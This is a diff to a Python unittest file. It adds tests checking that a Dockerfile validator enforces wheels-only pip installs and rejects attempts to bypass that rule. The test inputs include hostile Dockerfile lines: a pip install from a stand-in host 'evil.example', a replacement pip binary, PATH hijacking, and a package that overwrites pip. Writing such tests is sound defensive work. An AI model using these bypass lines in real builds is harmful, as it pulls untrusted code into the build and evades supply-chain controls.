@@ -2,7 +2,7 @@ import tempfile
 import unittest
 from pathlib import Path
 
-from core.dockerfile_validator import DockerfileValidationError, validate
+from core.dockerfile_validator import DockerfileValidationError, validate, with_wheels_only
 
 
 class DockerfileValidatorTests(unittest.TestCase):
@@ -62,6 +62,29 @@ class DockerfileValidatorTests(unittest.TestCase):
             path = self._write_dockerfile(f"FROM kaizen/base:latest\nRUN pip install {args}\n")
             with self.subTest(args), self.assertRaises(DockerfileValidationError):
                 validate(path, tier="imported")
+
+    def test_skill_cant_get_around_wheels_only(self):
+        for body in (
+            "COPY pip /usr/local/bin/pip\nRUN pip install six\n",  # its own pip
+            "ENV PIP_ONLY_BINARY=\nRUN pip install six\n",
+            "ENV PATH=/app:/usr/bin\nRUN pip install six\n",
+            "RUN pip install --no-binary=:all: six\n",
+            "RUN pip install --only-binary=:none: six\n",
+            "RUN pip install git+https://evil.example/x.git\n",
+            "RUN pip install evil && pip install six\n",     # evil's wheel replaces pip
+            "RUN pip install evil\nRUN apt-get update\n",   # or apt-get
+        ):
+            path = self._write_dockerfile("FROM kaizen/base:latest\n" + body)
+            with self.subTest(body), self.assertRaises(DockerfileValidationError):
+                validate(path)
+
+    def test_wheels_only_goes_right_after_from(self):
+        text = "# note\nFROM kaizen/base:latest\nRUN pip install six\n"
+        self.assertEqual(with_wheels_only(text),
+                         "# note\nFROM kaizen/base:latest\nENV PIP_ONLY_BINARY=:all:\nRUN pip install six\n")
+        for bad in ("# FROM x\n", "FROM \\\n  kaizen/base:latest\n"):
+            with self.subTest(bad), self.assertRaises(DockerfileValidationError):
+                with_wheels_only(bad)
 
     def test_normal_dockerfiles_still_pass(self):
         path = self._write_dockerfile(
